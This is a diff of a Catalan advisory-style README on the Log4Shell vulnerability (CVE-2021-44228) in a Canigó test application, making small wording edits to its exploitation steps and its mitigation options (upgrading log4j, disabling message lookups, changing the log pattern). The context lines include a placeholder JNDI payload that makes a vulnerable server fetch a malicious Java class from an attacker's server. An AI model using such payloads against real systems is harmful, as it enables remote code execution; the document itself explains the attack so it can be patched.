@@ -15,7 +15,7 @@ Per a explotar la vulnerabilitat, es poden seguir els següents passos:
 1. En el servidor que allotja l'aplicació vulnerable, es registra la informació que conté la càrrega útil maliciosa.
 Per exemple: `${jndi:ldap://[servidor]/[càrrega útil]}`, on el servidor està controlat per l'atacant i la càrrega útil conté les comandes a executar.
 
-2. La vulnerabilitat s'activa i el servidor vulnerable, sol·licita al servidor de l'atacant a través de JNDI el codi maliciós.
+2. La vulnerabilitat s'activa i el servidor vulnerable sol·licita al servidor de l'atacant a través de JNDI el codi maliciós.
 
 3. La resposta del servidor de l'atacant conté la ruta a una classe Java maliciosa. Per exemple: `http://[servidor]/exploit.class`,
 que s'injecta en el context de l'aplicació vulnerable.
@@ -35,26 +35,26 @@ Informació de referència:
 
 * **Opció 1**) Substituir la versió de la dependència de la libreria `log4j` en temps de compilació.
 
-    - 1.1) Modificar el fitxer `pom.xml` - **opció recomanada** -, tornar a compilar i desplegar l'aplicació:
+    - 1.1) Modificar el fitxer `pom.xml` - **opció recomanada** -, compilar i desplegar l'aplicació:
 ```xml
 <properties>
 <log4j2.version>2.15.0</log4j2.version>
 </properties>
 ```
 
-    - 1.2) Injectar la variable durant la construcció de l'aplicació, tornar a compilar i desplegar l'aplicació:
+    - 1.2) Injectar la variable durant la construcció de l'aplicació, compilar i desplegar l'aplicació:
 ```sh
 mvn -Dlog4j2.version=2.15.0 clean package && java -jar ./target/CanigoLog4jShellTest.war
 ```
 
 * **Opció 2**) Configurar la variable `log4j2.formatMsgNoLookups` en temps d'execució.
 
-    - 2.1) Injectar la variable (vàlid per a: 2.10 >= log4j <= 2.14.1) i tornar a desplegar l'aplicació:
+    - 2.1) Injectar la variable (vàlid per a: 2.10 >= log4j <= 2.14.1) i desplegar l'aplicació:
 ```sh
 mvn clean package && java -Dlog4j2.formatMsgNoLookups=true -jar ./target/CanigoLog4jShellTest.war
 ```
 
-    - 2.2) Afegir una variable d'entorn (vàlid per a: 2.10 >= log4j <= 2.14.1) i tornar a desplegar l'aplicació. Veure: https://msrc-blog.microsoft.com/2021/12/11/microsofts-response-to-cve-2021-44228-apache-log4j2/.
+    - 2.2) Afegir una variable d'entorn (vàlid per a: 2.10 >= log4j <= 2.14.1) i desplegar l'aplicació. Veure: https://msrc-blog.microsoft.com/2021/12/11/microsofts-response-to-cve-2021-44228-apache-log4j2/.
 ```sh
 mvn clean package docker:build \
 && docker run -it --rm \
@@ -65,7 +65,7 @@ mvn clean package docker:build \
 canigo/app
 ```
 
-* **Opció 3**) Modificar el patró de traces configurades al fitxer `log4j.xml` (vàlid per a: 2.7 >= log4j <= 2.14.1) i tornar a compilar i desplegar l'aplicació. Veure: https://kb.vmware.com/s/article/87093. 
+* **Opció 3**) Modificar el patró de traces configurades al fitxer `log4j.xml` (vàlid per a: 2.7 >= log4j <= 2.14.1), compilar i desplegar l'aplicació. Veure: https://kb.vmware.com/s/article/87093.
 ```sh
 ## canviar:
 <PatternLayout pattern="canigo Message: %d{dd MM yyyy HH:mm:ss,SSS} %-5p [%t] %-5p [%t] %c - %m%n" />
